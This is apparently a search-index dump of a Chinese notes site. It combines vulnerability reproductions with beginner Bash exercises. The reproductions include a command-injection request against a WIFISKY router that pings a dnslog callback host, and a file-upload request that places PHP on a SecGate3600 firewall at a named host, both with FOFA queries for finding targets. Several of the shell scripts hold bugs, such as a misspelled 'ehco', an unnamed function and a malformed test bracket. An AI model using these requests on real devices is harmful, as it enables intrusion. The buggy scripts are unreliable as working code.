u7528\u7684\u5e26\u5bbd\u4f18\u5148\u7ea7\uff0c\u5b9e\u73b0\u7f51\u7edc\u6d41\u91cf\u7684\u4f18\u5316\u548c\u7ba1\u7406\u3002\u540c\u65f6\uff0cWIFISKY7\u8fd8\u914d\u5907\u4e86\u5148\u8fdb\u7684\u9632\u706b\u5899\u548c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff0c\u6709\u6548\u4fdd\u969c\u7f51\u7edc\u5b89\u5168\u3002</p> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability4/index.html#2","title":"2.\u6f0f\u6d1e\u6982\u8ff0","text":"<p>WIFISKY-7\u5c42\u6d41\u63a7\u8def\u7531\u5668confirm.php\u63a5\u53e3\u5904\u5b58\u5728RCE\u6f0f\u6d1e\uff0c\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u5229\u7528\u6b64\u6f0f\u6d1e\u6267\u884c\u6076\u610f\u547d\u4ee4\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f\uff0c\u6700\u7ec8\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u5931\u9677\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability4/index.html#3","title":"3.\u6f0f\u6d1e\u590d\u73b0","text":"<p>FOFA\uff1a</p> <pre><code>title=\"WIFISKY 7\u5c42\u6d41\u63a7\u8def\u7531\u5668\"\n</code></pre> <p>POC\uff1a</p> <pre><code>GET /notice/confirm.php?t=;ping%20hjkca1.dnslog.cn HTTP/1.1\nHost: 127.0.0.1\nCookie: SESSID=hjdgshj7hbjhbytvjvhj8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nTe: trailers\nConnection: close\n</code></pre> <p></p> <p></p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability5/index.html","title":"\u5947\u5b89\u4fe1\u7f51\u795eSecGate3600\u9632\u706b\u5899obj_area_import_save\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":""},{"location":"Security_devices/Vulnerability_analysis/Vulnerability5/index.html#1","title":"1.\u6f0f\u6d1e\u4ecb\u7ecd","text":"<p>\u7f51\u795eSecGate3600\u9632\u706b\u5899\u662f\u4e00\u6b3e\u80fd\u591f\u5168\u9762\u5e94\u5bf9\u4f20\u7edf\u7f51\u7edc\u653b\u51fb\u548c\u9ad8\u7ea7\u5a01\u80c1\u7684\u521b\u65b0\u578b\u9632\u706b\u5899\u4ea7\u54c1\uff0c\u57fa\u4e8e\u9e92\u9e9f\u64cd\u4f5c\u7cfb\u7edf\u4e0e\u98de\u817e\u786c\u4ef6\u5e73\u53f0\u6253\u9020\uff0c\u53ef\u5e7f\u6cdb\u8fd0\u7528\u4e8e\u653f\u5e9c\u673a\u6784\u3001\u5404\u7c7b\u4f01\u4e1a\u548c\u7ec4\u7ec7\u7684\u4e1a\u52a1\u7f51\u7edc\u8fb9\u754c\uff0c\u5b9e\u73b0\u7f51\u7edc\u5b89\u5168\u57df\u9694\u79bb\u3001\u7cbe\u7ec6\u5316\u8bbf\u95ee\u63a7\u5236\u3001\u9ad8\u6548\u7684\u5a01\u80c1\u9632\u62a4\u548c\u9ad8\u7ea7\u5a01\u80c1\u68c0\u6d4b\u7b49\u529f\u80fd\u3002\u8be5\u8f6f\u4ef6obj_area_import_save\u63a5\u53e3\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u672a\u7ecf\u6388\u6743\u7684\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u6b64\u6f0f\u6d1e\u4e0a\u4f20\u6076\u610f\u540e\u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002</p>"},{"location":"Security_devices/Vulnerability_analysis/Vulnerability5/index.html#2","title":"2.\u6f0f\u6d1e\u590d\u73b0","text":"<p>FOFA\uff1a</p> <pre><code>fid=\"1Lh1LHi6yfkhiO83I59AYg==\"\n</code></pre> <p></p> <p>POC\uff1a</p> <pre><code>POST /?g=obj_app_upfile HTTP/1.1\nHost: jg.zhongdinggroup.com:8889\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 574\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc\nUser-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n10000000\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\nContent-Type: text/plain\n\n&lt;?php phpinfo();?&gt;\n\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"submit_post\"\n\nobj_app_upfile\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\nContent-Disposition: form-data; name=\"__hash__\"\n\n0b9d6b1ab7479ab69d9f71b05e0e9445\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--\n</code></pre> <p></p> <p>\u9ed8\u8ba4\u4e0a\u4f20\u8def\u5f84 /secgate/webui/attachements/ \uff0c \u8bbf\u95ee attachements/test.php \u6587\u4ef6</p> <p></p>"},{"location":"Shell_Scripts/index.html","title":"Shell_Scripts","text":"<p>\u8bb0\u8f7d\u5b66\u4e60Shell\u811a\u672c\u77e5\u8bc6\u70b9\u7684\u7b14\u8bb0\uff0cShell\u811a\u672c</p> <ul> <li>Day1</li> <li>Day2</li> <li>Day3</li> <li>Day4</li> <li>Day5</li> <li>Day6</li> <li>Day7</li> <li>Day8</li> <li>Day9</li> <li>Day10</li> <li>Day11</li> <li>Day12</li> <li>Day13</li> </ul>"},{"location":"Shell_Scripts/Day1/index.html","title":"Index","text":"<ul> <li>\u5199\u4e00\u4e2a\u811a\u672c\uff0c\u904d\u5386/data/\u76ee\u5f55\u4e0b\u7684txt\u6587\u4ef6</li> <li>\u5c06\u8fd9\u4e9btxt\u6587\u4ef6\u505a\u4e00\u4e2a\u5907\u4efd</li> <li>\u5907\u4efd\u7684\u6587\u4ef6\u540d\u589e\u52a0\u4e00\u4e2a\u5e74\u6708\u65e5\u7684\u540e\u7f00\uff0c\u6bd4\u5982\u5c06tom.txt\u5907\u4efd\u4e3atom.txt_20240424</li> </ul> <pre><code>#!/bin/bash\n##\u5b9a\u4e49\u540e\u7f00\u53d8\u91cf\uff0c\u6ce8\u610f\u4e0b\u9762``(\u53cd\u5f15\u53f7)\u7684\u542b\u4e49\nsuffix=`date +%Y%m%d`\n\n##\u627e\u5230/data/\u76ee\u5f55\u4e0b\u7684txt\u6587\u4ef6\uff0c\u7528for\u5faa\u73af\u904d\u5386\nfor f in `find /data/ -type f -name \"*.txt\"`\ndo\n    echo \"\u5907\u4efd\u6587\u4ef6$f\"\n    cp ${f} ${f}_${suffix}\ndone \n</code></pre>"},{"location":"Shell_Scripts/Day1/index.html#_1","title":"\u603b\u7ed3\uff1a","text":"<ol> <li>date\u547d\u4ee4\u7528\u6cd5\uff0c\u53ef\u4ee5\u6839\u636e\u65e5\u671f\uff0c\u65f6\u95f4\u83b7\u53d6\u5230\u60f3\u8981\u7684\u5b57\u7b26</li> <li>for\u5faa\u73af\u5982\u4f55\u904d\u5386\u6587\u4ef6</li> <li>\u5728 Bash \u811a\u672c\u4e2d\uff0c\u4e0d\u5e94\u8be5\u6709\u7a7a\u683c\u5728\u53d8\u91cf\u8d4b\u503c\u7684\u7b49\u53f7\u4e24\u8fb9\u3002</li> </ol>"},{"location":"Shell_Scripts/Day10/index.html","title":"Index","text":"<ul> <li>\u5199\u4e00\u4e2a\u76d1\u63a7\u811a\u672c\uff0c\u76d1\u63a7\u67d0\u7ad9\u70b9\u8bbf\u95ee\u662f\u5426\u6b63\u5e38\u3002</li> <li>\u53ef\u4ee5\u5c06\u8bbf\u95ee\u7684\u7ad9\u70b9\u4ee5\u53c2\u6570\u7684\u5f62\u5f0f\u63d0\u4f9b\uff0c\u4f8b\u5982 sh xxx.sh www.aminglinux.com</li> <li>\u72b6\u6001\u7801\u4e3a2xx\u6216\u80053xx\u8868\u793a\u6b63\u5e38</li> <li>\u6b63\u5e38\u65f6echo\u6b63\u5e38\uff0c\u4e0d\u6b63\u5e38\u65f6echo\u4e0d\u6b63\u5e38</li> </ul> <pre><code>#!/bin/bash\n\n##\u68c0\u67e5\u672c\u673a\u6709\u6ca1\u6709curl\u547d\u4ee4\nif ! which curl &amp;&gt;/dev/null\nthen\n    echo \"\u672c\u673a\u6ca1\u6709\u5b89\u88c5curl\"\n    ## \u8fd9\u91cc\u5047\u8bbe\u7cfb\u7edf\u4e3aCentos/RHEL/Rocky\n    yum install -y curl\n    if [ $? -ne 0 ]\n    then\n        echo \"\u6ca1\u6709\u5b89\u88c5\u6210\u529fcurl\"\n        exit 1\n    fi\nfi\n##\u83b7\u53d6\u72b6\u6001\u7801\ncode=`curl --connect-timeout 3 -I $1 2&gt;/dev/null |grep 'HTTP' | awk '{print $2}'`\n##\u72b6\u6001\u7801\u662f2xx\u6216\u8005\u662f3xx\uff0c\u5219\u6761\u4ef6\u6210\u7acb\nif echo $code |grep -qE '^2[0-9][0-9]|^3[0-9][0-9]'\nthen\n    echo \"$1\u8bbf\u95ee\u6b63\u5e38\"\nelse\n    echo \"$1\u8bbf\u95ee\u4e0d\u6b63\u5e38\"\nfi\n</code></pre>"},{"location":"Shell_Scripts/Day11/index.html","title":"Index","text":"<ul> <li>\u4f7f\u7528\u4f20\u53c2\u7684\u65b9\u6cd5\u5199\u4e2a\u811a\u672c\uff0c\u5b9e\u73b0\u52a0\u51cf\u4e58\u9664\u7684\u529f\u80fd</li> <li>\u4f8b\u5982\uff1a sh  a.sh  1 2,\u8fd9\u6837\u4f1a\u5206\u522b\u8ba1\u7b97\u52a0\u51cf\u4e58\u9664\u7684\u7ed3\u679c</li> <li>\u8981\u6c42\uff1a\u811a\u672c\u9700\u5224\u65ad\u63d0\u4f9b\u7684\u4e24\u4e2a\u6570\u5b57\u5fc5\u987b\u4e3a\u6574\u6570\uff1b\u5f53\u505a\u51cf\u6cd5\u6216\u8005\u9664\u6cd5\u65f6\uff0c\u9700\u5224\u65ad\u90a3\u4e2a\u6570\u5b57\u5927\uff1b\u51cf\u6cd5\u65f6\u9700\u8981\u7528\u5927\u7684\u6570\u5b57\u51cf\u5c0f\u7684\u6570\u5b57\uff1b\u9664\u6cd5\u65f6\u9700\u8981\u7528\u5927\u7684\u6570\u5b57\u9664\u4ee5\u5c0f\u7684\u6570\u5b57\uff0c\u5e76\u4e14\u7ed3\u679c\u9700\u8981\u4fdd\u7559\u4e24\u4e2a\u5c0f\u6570\u70b9\u3002</li> </ul> <pre><code>#!/bin/bash\n\n##\u5148\u5224\u65ad\u53c2\u6570\u662f\u4e0d\u662f2\u3001\nif [ $# -ne 2 ]\nthen\n    echo \"The number of parameter is not 2,Please useage: ./$0 1 2\"\n    exit 1\nfi\n\n##\u5224\u65ad\u63d0\u4f9b\u7684\u6570\u5b57\u662f\u5426\u662f\u6b63\u6574\u6570\nis_int()\n{\n    if echo \"$1\"|grep -q '[^0-9]'\n    then\n    echo \"$1 is not integer number.\"\n    exit 1\n    fi\n}\n\n##\u627e\u5927\u6570\nmax()\n{\n    if [ $1 -ge $2 ]\n    then\n    echo $1\n    else\n    echo $2\n    fi\n}\n##\u627e\u5c0f\u6570\nmin()\n{\n    if [ $1 -lt $2 ]\n    then\n    echo $1\n    else\n    ehco $2\n    fi\n}\n## \u52a0\u6cd5\nsum()\n{\n    echo \"$1 +$2 = $[$1+$2]\"\n}\n## \u51cf\u6cd5\n{\n    big=`max $1 $2`\n    small=`min $1 $2`\n    echo \"$big - $small  = $[$big-$small]\"\n}\n##\u4e58\u6cd5\nmult()\n{\n    echo \"$1 * $2 = $[$1*$2]\"\n}\n##\u9664\u6cd5\ndiv()\n{\n    big=`max $1 $2`\n    small=`min $1 $2`\n    d=`echo \"scale = 2; $big / $small\"|bc`\n    echo \"$big / $small = $d\"\n}\n\n##\u8c03\u7528\u5404\u4e2a\u51fd\u6570\nis_int $1\nis_int $2\nsum $1 $2\nminus $1 $2\nmult $1 $2\ndiv $1 $2\n</code></pre>"},{"location":"Shell_Scripts/Day11/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>\u811a\u672c\u53c2\u6570\u4e3a<code>$1</code>, <code>$2</code>,<code>$3</code>...\u53c2\u6570\u4e2a\u6570\u4e3a$#</li> <li>\u811a\u672c\u4e2d\u51fd\u6570\u7528\u6cd5\uff0c\u51fd\u6570\u4e5f\u652f\u6301\u53c2\u6570</li> <li>\u6570\u5b66\u8fd0\u7b97\u53ef\u4ee5\u501f\u52a9bc\uff0cbc\u4e3aLinux\u4e2d\u4e00\u4e2a\u8ba1\u7b97\u5668</li> </ol>"},{"location":"Shell_Scripts/Day12/index.html","title":"Index","text":"<ul> <li>\u7f16\u5199\u4e00\u4e2a\u5e26\u53c2\u6570\u7684\u811a\u672c\uff0c\u5b9e\u73b0\u4e0b\u8f7d\u6587\u4ef6\u7684\u6548\u679c\uff0c\u53c2\u6570\u6709\u4e24\u4e2a\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6587\u4ef6\u4e0b\u8f7d\u94fe\u63a5\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u76ee\u5f55\uff0c\u5373\u4e0b\u8f7d\u540e\u4fdd\u5b58\u7684\u4f4d\u7f6e</li> <li>\u6ce8\u610f\u8981\u8003\u8651\u76ee\u5f55\u4e0d\u5b58\u5728\u7684\u60c5\u51b5\uff0c\u811a\u672c\u9700\u8981\u63d0\u793a\u7528\u6237\u662f\u5426\u521b\u5efa\u76ee\u5f55   <pre><code>#!/bin/bash\n\n##\u65e0\u9650\u5faa\u73af\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u521b\u5efa\u76ee\u5f55\nwhile :\ndo\n    ##\u76ee\u5f55\u5b58\u5728,\u5c31\u8df3\u51fa\u5faa\u73af\u4e86\n    if [ -d $2 ]\n    then\n        break\n    else\n    ## \u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u4f1a\u8be2\u95ee\u662f\u5426\u521b\u5efa\n        read -p \"\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u662f\u5426\u8981\u521b\u5efa\uff1f(\u8f93\u5165y\u6216\u8005n)\" yn\n        case $yn in\n            y|Y)\n                mkdir -p $2\n                break\n                ;;\n            n|N)\n                ## \u5f53\u7528\u6237\u8f93\u5165n\uff0c\u610f\u5473\u7740\u4ed6\u4e0d\u60f3\u521b\u5efa\u76ee\u5f55\uff0c\u7136\u540e\u811a\u672c\u76f4\u63a5\u9000\u51fa\u5373\u53ef\n                exit 2 \n                ;;\n            *)\n                ## \u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u63d0\u793a\u8bcd\u5e76\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u5219\u9700\u8981\u518d\u6b21\u8be2\u95ee\u7528\u6237\n                echo \"\u4f60\u53ea\u80fd\u8f93\u5165y\u6216\u8005n\"\n                continue\n                ;;\n        esac\n    fi\ndone\n\n##\u8fdb\u5165\u5230\u76ee\u6807\u76ee\u5f55\u91cc\ncd $2\n##\u4f7f\u7528wget\u547d\u4ee4\u6765\u4e0b\u8f7d\uff0c\u8fd9\u91cc\u5047\u8bbewget\u547d\u4ee4\u5b58\u5728\uff0c1\u5e76\u4e14\u7528\u6237\u63d0\u4f9b\u7684\u94fe\u63a5\u6ca1\u95ee\u9898\nwget $1\n\nif [ $? -eq 0 ];then\n    echo \"\u4e0b\u8f7d\u6210\u529f\"\n    exit 0\nelse\n    echo \"\u4e0b\u8f7d\u5931\u8d25\"\n    exit 1\nfi\n</code></pre></li> </ul>"},{"location":"Shell_Scripts/Day12/index.html#_1","title":"\u603b\u7ed3","text":"<ol> <li>\u811a\u672c\u53c2\u6570\u4e3a<code>$1</code>,<code>$2</code></li> <li>read -p \u4f7f\u7528\u5728\u548c\u7528\u6237\u4ea4\u4e92\u7684\u573a\u666f</li> </ol>"},{"location":"Shell_Scripts/Day13/index.html","title":"Index","text":"<ul> <li>\u4f7f\u7528shell\u811a\u672c\u5b9e\u73b0\uff1a\u591a\u4eba\u62bd\u7b7e\u6e38\u620f\uff0c\u6bcf\u4eba\u6267\u884c\u811a\u672c\u4ea7\u751f\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u5177\u4f53\u8981\u6c42\u5982\u4e0b\uff1a</li> <li>\u811a\u672c\u6267\u884c\u540e\uff0c\u8f93\u5165\u4eba\u540d\uff0c\u4ea7\u751f1-99\u4e4b\u95f4\u7684\u6570\u5b57\uff1b\u76f8\u540c\u7684\u540d\u5b57\u91cd\u590d\u6267\u884c\uff0c\u6293\u5230\u7684\u6570\u5b57\u5e94\u8be5\u548c\u4e4b\u524d\u7684\u4fdd\u6301\u4e00\u81f4\uff1b\u524d\u9762\u5df2\u7ecf\u51fa\u73b0\u7684\u6570\u5b57\uff0c\u4e0b\u6b21\u4e0d\u80fd\u518d\u51fa\u73b0\uff1b\u9700\u8981\u5c06\u540d\u5b57\u548c\u5bf9\u5e94\u7684\u6570\u5b57\u8bb0\u5f55\u5230\u4e00\u4e2a\u6587\u4ef6\u91cc\uff1b\u811a\u672c\u4e00\u65e6\u8fd0\u884c\uff0c\u9664\u975e\u6309Ctrl+C\u505c\u6b62\uff0c\u5426\u5219\u8981\u4e00\u76f4\u8fd0\u884c\u3002</li> </ul> <pre><code>#!/bin/bash\n\n##\u5047\u8bbe\u8bb0\u5f55\u540d\u5b57\u548c\u6570\u5b57\u7684\u6587\u4ef6\u4e3a/tmp/name.log\n##\u6587\u4ef6\u683c\u5f0f\u4e3a: name:number,\u4f8b\u5982 : aming:99\n\n##\u521b\u5efa\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\ncreate_number()\n{\n    ##\u5f53\u9047\u5230\u5df2\u7ecf\u51fa\u73b0\u8fc7\u7684\u6570\u5b57\uff0c\u9700\u8981\u81ea\u52a8\u518d\u6b21\u751f\u6210\u968f\u673a\u6570\uff0c\u7528while\u5faa\u73af\u5b9e\u73b0\n    while :\n    do\n        ##$RANDOM\u4e3a\u4e00\u4e2a\u968f\u673a\u6570\u5b57\uff0c\u8303\u56f40-32767(2^15-1)\n        ##\u6211\u4eec\u4e3a\u4e86\u83b7\u53d61-99\u4e4b\u524d\u7684\u968f\u673a\u6570\uff0c\u9700\u8981\u5c06$RANDOM\u9664\u4ee599\u53d6\u4f59\u6570\n        ##\u4f46\u4f59\u6570\u8303\u56f4\u4e3a0-98\uff0c\u6240\u4ee5\u518d\u52a01\u5c31\u80fd\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u6570\u5b57\n        nu=$[$RANDOM%99+1]\n\n        ##\u5982\u679c\u6570\u5b57\u51fa\u73b0\u5728\u4e86/tmp/name.log\u91cc\uff0c\u5219n&gt;0,n\u5c31\u662f\u6570\u5b57\u51fa\u73b0\u7684\u6b21\u6570\n        n=`awk -F ':' -v NUMBER=$nu '$2 == NUMBER' /tmp/name.log|wc -l`\n        if [ $n -gt 0 ]\n        then\n            continue\n        else\n            echo $nu\n            break\n        fi\n    done\n}\n\n## while\u5faa\u73af\u5b9e\u73b0\u811a\u672c\u4e0d\u9000\u51fa\nwhile :\ndo\n    ##\u548c\u7528\u6237\u4ea4\u4e92\uff0c\u8f93\u5165\u540d\u5b57\n    read -p \"Please input a name:\" name\n\n    if [ ! -f /tmp/name.log]\n    then\n        ##\u5f53\u8bb0\u5f55\u540d\u5b57\u548c\u6570\u5b57\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u65f6\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u811a\u672c\u7b2c\u4e00\u6b21\u6267\u884c\u65f6\n        ##\u4ec0\u4e48\u90fd\u4e0d\u7528\u8003\u8651\uff0c\u76f4\u63a5\u6253\u5370\u6570\u5b57\u5373\u53ef\n        number=$[$RANDOM%99+1]\n        echo \"Your number is: $number\"\n        echo \"$name:$number\" &gt; /tmp/name.log\n    else\n        ##\u5982\u679c\u8f93\u5165\u7684\u540d\u5b57\u51fa\u73b0\u5728\u4e86/tmp/name.log\u91cc\uff0c\u5219n&gt;0,n\u5c31\u662f\u540d\u5b57\u51fa\u73b0\u7684\u6b21\u6570\n        n=`awk -F ':' -v NAME=$name '$1 == NAME' /tmp/name.log|wc -l`\n        if [ $n -gt 0 ]\n        then\n            echo \"The name already exist\"\n            awk -F ':' -v NAME=$name '$1 == NAME' /tmp/name.log\n            continue\n        else\n            number=`create_number`\n        fi\n        echo \"Your number is: $number\"\n        echo \"$name:$number\" &gt;&gt; /tmp/name.log\n    fi\ndone\n</code></pre>"},{"location":"Shell_Scripts/Day13/index.html#_1","title":"\u603b\u7ed3\uff1a","text":"<ol> <li>awk\u8c03\u7528shell\u4e2d\u7684\u53d8\u91cf\u7528\u6cd5 <code>awk -v NAME=$name '$1 == NAME</code></li> <li>$RANDOM\u7528\u6cd5</li> </ol>"},{"location":"Shell_Scripts/Day2/index.html","title":"Index","text":"<ul> <li>\u521b\u5efa\u5341\u4e2a\u7528\u6237\uff0c\u5e76\u7ed9\u4ed6\u4eec\u8bbe\u7f6e\u968f\u673a\u5bc6\u7801\uff0c\u5bc6\u7801\u8bb0\u5f55\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u6587\u4ef6\u540d\u4e3auserinfo_txt</li> <li>\u7528\u6237\u4eceuser_00\u5230user_09</li> <li>\u5bc6\u7801\u8981\u6c42\uff1a\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\u4ee5\u53ca\u6570\u5b57\uff0c\u5bc6\u7801\u957f\u5ea6\u4e3a15\u4f4d   <pre><code>#!/bin/bash\n\n##\u5148\u67e5\u770b/tmp/userinfo.txt\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5b58\u5728\u7684\u8bdd\u5148\u5220\u9664\uff0c\u4ee5\u514d\u5f71\u54cd\u811a\u672c\u7ed3\u679c\nif [ -f /tmp/userinfo.txt ]\nthen\n    rm -f /tmp/userinfo.txt\nfi\n\n##\u5224\u65admkpasswd\u547d\u4ee4\u5728\u4e0d\u5728\uff0c\u6211\u4eec\u4f7f\u7528\u8be5\u547d\u4ee4\u6765\u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32\u4e5f\u5c31\u662f\u7528\u6237\u7684\u5bc6\u7801\nif ! which mkpasswd\nthen\n##\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5047\u5b9a\u7cfb\u7edf\u662fCentos\u6216\u8005Rocky\uff0c\u53ef\u4ee5\u4f7f\u7528yum\u5b89\u88c5\u5305\n    yum install -y expect\nfi\n\n##\u501f\u52a9seq\u751f\u6210\u4ece00\u523009\uff0c10\u4e2a\u6570\u7684\u961f\u5217\nfor i in `seq -w 0 09`\ndo\n    ##\u6bcf\u6b21\u751f\u6210\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u5c06\u8be5\u5b57\u7b26\u4e32\u8d4b\u503c\u7ed9p\u53d8\u91cf\uff0c\u8fd9\u4e2a\u5c31\u662f\u7528\u6237\u7684\u5bc6\u7801\n    ##mkpasswd\u547d\u4ee4\u9ed8\u8ba4\u751f\u6210\u7684\u5b57\u7b26\u4e32\u4f1a\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57\u548c\u7279\u6b8a\u7b26\u53f7\n    ##\u5982\u679c\u4e0d\u8981\u6c42\u7279\u6b8a\u7b26\u53f7\uff0c\u53ef\u4ee5\u6dfb\u52a0-s 0 \u6765\u9650\u5b9a\u4e0d\u4f7f\u7528\u7279\u6b8a\u7b26\u53f7\n    p=`mkpasswd -l 15 -s 0`\n    ##\u6dfb\u52a0\u7528\u6237\uff0c\u5e76\u7ed9\u8be5\u7528\u6237\u8bbe\u7f6e\u5bc6\u7801\n    useradd user_${i} &amp;&amp; echo \"${p}\"| passwd --stdin user_${i}\n    echo \"user_${i} ${p}\" &gt;&gt; /tmp/userinfo.txt\ndone\n</code></pre></li> </ul> <p>\u6211\u7684\u673a\u5b50\u4e0d\u662fCentos\uff0c\u8fd9\u91cc\u5c31\u4e0d\u6f14\u793a\u4e86\u3002</p>"},{"location":"Shell_Scripts/Day2/index.html#_1","title":"\u603b\u7ed3\uff1a","text":"<p>1.mkpasswd\u53ef\u4ee5\u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32\uff0c-l\u6307\u5b9a\u957f\u5ea6\uff0c-s\u6307\u5b9a\u7279\u6b8a\u5b57\u7b26\u4e2a\u6570\uff0c-c\u6307\u5b9a\u5c0f\u5199\u5b57\u6bcd\u4e2a\u6570\uff0c-C\u6307\u5b9a\u5927\u5199\u5b57\u6bcd\u4e2a\u6570\uff0c-d\u6307\u5b9a\u6570\u5b57\u4e2a\u6570</p> <p>2.seq\u53ef\u4ee5\u751f\u6210\u5e8f\u5217\uff0c\u7528\u6cd5\uff1a seq 1 5 ;seq 5; seq 1 2 10; seq 10 -2 1;seq -w 1 10</p> <p>3.passwd --stdin username</p>"},{"location":"Shell_Scripts/Day3/index.html","title":"Index","text":"<ul> <li>\u5199\u4e00\u4e2a\u68c0\u6d4b\u811a\u672c\uff0c\u7528\u6765\u68c0\u6d4b\u672c\u673a\u6240\u6709\u78c1\u76d8\u5206\u533a\u8bfb\u5199\u662f\u5426\u6b63\u5e38</li> <li>\u53ef\u4ee5\u904d\u5386\u6240\u6709\u6302\u8f7d\u70b9\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u6d4b\u8bd5\u6587\u4ef6</li> <li>\u7136\u540e\u518d\u5220\u9664\u6d4b\u8bd5\u6587\u4ef6\uff0c\u5982\u679c\u53ef\u4ee5\u6b63\u5e38\u65b0\u5efa\u548c\u5220\u9664\uff0c\u90a3\u8bf4\u660e\u8be5\u5206\u533a\u6ca1\u95ee\u9898   <pre><code>#!/bin/bash\n\nfor mount_p in `df |sed '1d' |grep -v 'tmpfs' |awk '{print $NF}'`\ndo\n  ## \u521b\u5efa\u6d4b\u8bd5\u6587\u4ef6\uff0c\u5e76\u5220\u9664\uff0c\u4ece\u800c\u786e\u5b9a\u8be5\u78c1\u76d8\u5206\u533a\u662f\u5426\u6709\u95ee\u9898\n  touch $mount_p/testfile &amp;&amp; rm -f $mount_p/testfile\n  if [ $? -ne 0 ]\n  then\n      echo \"$mount_p \u8bfb\u5199\u6709\u95ee\u9898\"\n  else\n      echo \"$mount_p \u8bfb\u5199\u6b63\u5e38 \"\n  fi\ndone\n</code></pre></li> </ul> <pre><code>\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u663e\u793a\u7cfb\u7edf\u4e2d\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\uff08\u4e0d\u5305\u62ectmpfs\uff09\u7684\u6302\u8f7d\u70b9\u3002\n</code></pre> <ul> <li>df: \u8fd9\u662f\u4e00\u4e2a\u5e38\u7528\u7684\u547d\u4ee4\uff0c\u7528\u4e8e\u663e\u793a\u6587\u4ef6\u7cfb\u7edf\u7684\u78c1\u76d8\u7a7a\u95f4\u5229\u7528\u60c5\u51b5\u3002</li> <li>|: \u8fd9\u662f\u7ba1\u9053\u64cd\u4f5c\u7b26\uff0c\u5b83\u5c06\u547d\u4ee4\u7684\u8f93\u51fa\u4f20\u9012\u7ed9\u4e0b\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li>sed '1d': \u8fd9\u4e2a\u547d\u4ee4\u4f7f\u7528sed\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u6d41\u7f16\u8f91\uff0c\u8fd9\u91cc\u76841d\u8868\u793a\u5220\u9664\u7b2c\u4e00\u884c\u3002\u901a\u5e38\uff0cdf\u7684\u8f93\u51fa\u7684\u7b2c\u4e00\u884c\u662f\u8868\u5934\uff0c\u6211\u4eec\u5e0c\u671b\u5c06\u5176\u5220\u9664\u3002</li> <li>grep -v 'tmpfs': grep\u547d\u4ee4\u7528\u4e8e\u641c\u7d22\u5339\u914d\u7684\u6587\u672c\u884c\uff0c-v\u9009\u9879\u8868\u793a\u53cd\u5411\u5339\u914d\uff0c\u5373\u53ea\u8f93\u51fa\u4e0d\u5305\u542b'tmpfs'\u7684\u884c\u3002tmpfs\u662f\u4e00\u79cd\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u4e34\u65f6\u6587\u4ef6\u7cfb\u7edf\u7684\u65b9\u5f0f\uff0c\u8fd9\u4e2a\u547d\u4ee4\u53ef\u80fd\u4f1a\u6392\u9664\u8fd9\u4e9b\u6587\u4ef6\u7cfb\u7edf\u3002</li> <li>awk '{print $NF}': awk\u662f\u4e00\u79cd\u5f3a\u5927\u7684\u6587\u672c\u5904\u7406\u5de5\u5177\uff0c\u8fd9\u91cc'{print 